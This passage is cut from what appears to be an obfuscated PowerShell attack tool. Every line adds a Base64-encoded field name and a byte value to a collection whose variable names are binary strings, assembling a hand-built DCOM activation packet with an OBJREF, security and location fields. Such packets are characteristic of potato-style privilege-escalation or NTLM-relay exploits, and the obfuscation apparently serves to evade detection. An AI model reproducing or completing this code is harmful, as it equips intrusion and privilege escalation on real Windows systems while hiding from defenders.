    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBDAG8AbQBtAG8AbgBIAGUAYQBkAGUAcgA='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBQAHIAaQB2AGEAdABlAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBJAG4AcwB0AGEAbgB0AGkAYQB0AGUAZABPAGIAagBlAGMAdABDAGwAcwBJAGQA'))),[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBDAGwAYQBzAHMAQwBvAG4AdABlAHgAdAA='))),[Byte[]](0x14,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBBAGMAdABpAHYAYQB0AGkAbwBuAEYAbABhAGcAcwA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBGAGwAYQBnAHMAUwB1AHIAcgBvAGcAYQB0AGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBJAG4AdABlAHIAZgBhAGMAZQBJAGQAQwBvAHUAbgB0AA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAGYAbwBJAG4AcwB0AGEAbgB0AGkAYQB0AGkAbwBuAEYAbABhAGcA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAHQAZQByAGYAYQBjAGUASQBkAHMAUAB0AHIA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ARQBuAHQAaQByAGUAUAByAG8AcABlAHIAdAB5AFMAaQB6AGUA'))),[Byte[]](0x58,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4AVgBlAHIAcwBpAG8AbgBNAGEAagBvAHIA'))),[Byte[]](0x05,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4AVgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x07,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAHQAZQByAGYAYQBjAGUASQBkAHMAUAB0AHIATQBhAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAHQAZQByAGYAYQBjAGUASQBkAHMA'))),[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEkAbgBzAHQAYQBuAHQAaQBhAHQAaQBvAG4ASQBuAHQAZQByAGYAYQBjAGUASQBkAHMAVQBuAHUAcwBlAGQAQgB1AGYAZgBlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbwBtAG0AbwBuAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAFAAcgBpAHYAYQB0AGUASABlAGEAZABlAHIA'))),[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AE8AawA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAFIAZQBzAGUAcgB2AGUAZAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAFIAZQBzAGUAcgB2AGUAZAAyAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAFIAZQBzAGUAcgB2AGUAZAAzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAE4AVQBMAEwAUAB0AHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQAVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x60,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQAQwBuAHQARABhAHQAYQA='))),[Byte[]](0x60,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYAUwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x4d,0x45,0x4f,0x57))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYARgBsAGEAZwBzAA=='))),[Byte[]](0x04,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYASQBJAEQA'))),[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYAQwBVAFMAVABPAE0ATwBCAEoAUgBFAEYAQwBMAFMASQBEAA=='))),[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYAQwBVAFMAVABPAE0ATwBCAEoAUgBFAEYAQwBCAEUAeAB0AGUAbgBzAGkAbwBuAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAEMAbABpAGUAbgB0AFAAdAByAEMAbABpAGUAbgB0AEMAbwBuAHQAZQB4AHQATwBCAEoAUgBFAEYAQwBVAFMAVABPAE0ATwBCAEoAUgBFAEYAUwBpAHoAZQA='))),[Byte[]](0x30,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEEAYwB0AGkAdgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdABJAG4AZgBvAFUAbgB1AHMAZQBkAEIAdQBmAGYAZQByAA=='))),[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAEMAbwBtAG0AbwBuAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFAAcgBpAHYAYQB0AGUASABlAGEAZABlAHIA'))),${01000011101100001})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBGAGwAYQBnAHMA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUAB0AHIAUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAE4AVQBMAEwAUAB0AHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAGEAbQBlAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x04,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAFUATABMAFAAdAByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBSAGUAcwBlAHIAdgBlAGQAMgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAGEAbQBlAE0AYQB4AEMAbwB1AG4AdAA='))),${10011100000010111})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAGEAbQBlAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAGEAbQBlAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${10011100000010111})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAZQBjAHUAcgBpAHQAeQBJAG4AZgBvAFMAZQByAHYAZQByAEkAbgBmAG8AUwBlAHIAdgBlAHIASQBuAGYAbwBOAGEAbQBlAFMAdAByAGkAbgBnAA=='))),${10010000010101111})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAEMAbwBtAG0AbwBuAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAFAAcgBpAHYAYQB0AGUASABlAGEAZABlAHIA'))),[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAE4AVQBMAEwAUAB0AHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAFAAcgBvAGMAZQBzAHMASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
